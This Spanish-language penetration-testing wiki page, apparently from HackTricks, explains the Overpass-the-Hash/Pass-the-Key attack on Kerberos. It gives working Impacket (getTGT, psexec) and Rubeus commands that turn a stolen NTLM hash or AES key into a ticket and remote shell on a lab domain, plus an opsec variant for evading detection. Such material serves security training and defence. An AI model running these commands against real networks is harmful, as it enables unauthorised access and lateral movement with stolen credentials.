# Over Pass the Hash/Pass the Key

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}


## Overpass The Hash/Pass The Key (PTK)

El ataque **Overpass The Hash/Pass The Key (PTK)** está diseñado para entornos donde el protocolo NTLM tradicional está restringido y la autenticación Kerberos tiene prioridad. Este ataque aprovecha el hash NTLM o las claves AES de un usuario para solicitar tickets Kerberos, lo que permite el acceso no autorizado a recursos dentro de una red.

Para ejecutar este ataque, el primer paso implica adquirir el hash NTLM o la contraseña de la cuenta del usuario objetivo. Al asegurar esta información, se puede obtener un Ticket Granting Ticket (TGT) para la cuenta, lo que permite al atacante acceder a servicios o máquinas a los que el usuario tiene permisos.

El proceso se puede iniciar con los siguientes comandos:
```bash
python getTGT.py jurassic.park/velociraptor -hashes :2a3de7fe356ee524cc9f3d579f2e0aa7
export KRB5CCNAME=/root/impacket-examples/velociraptor.ccache
python psexec.py jurassic.park/velociraptor@labwws02.jurassic.park -k -no-pass
```
Para escenarios que requieren AES256, se puede utilizar la opción `-aesKey [AES key]`. Además, el ticket adquirido puede ser empleado con varias herramientas, incluyendo smbexec.py o wmiexec.py, ampliando el alcance del ataque.

Los problemas encontrados como _PyAsn1Error_ o _KDC cannot find the name_ se resuelven típicamente actualizando la biblioteca Impacket o utilizando el nombre de host en lugar de la dirección IP, asegurando la compatibilidad con el KDC de Kerberos.

Una secuencia de comandos alternativa utilizando Rubeus.exe demuestra otro aspecto de esta técnica:
```bash
.\Rubeus.exe asktgt /domain:jurassic.park /user:velociraptor /rc4:2a3de7fe356ee524cc9f3d579f2e0aa7 /ptt
.\PsExec.exe -accepteula \\labwws02.jurassic.park cmd
```
Este método refleja el enfoque de **Pass the Key**, con un enfoque en apoderarse y utilizar el ticket directamente para fines de autenticación. Es crucial notar que la iniciación de una solicitud de TGT activa el evento `4768: A Kerberos authentication ticket (TGT) was requested`, lo que significa un uso de RC4-HMAC por defecto, aunque los sistemas Windows modernos prefieren AES256.

Para conformarse a la seguridad operativa y usar AES256, se puede aplicar el siguiente comando:
```bash
.\Rubeus.exe asktgt /user:<USERNAME> /domain:<DOMAIN> /aes256:HASH /nowrap /opsec
```
## Referencias

* [https://www.tarlogic.com/es/blog/como-atacar-kerberos/](https://www.tarlogic.com/es/blog/como-atacar-kerberos/)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

{% hint style="success" %}
Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Apoya a HackTricks</summary>

* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.

</details>
{% endhint %}
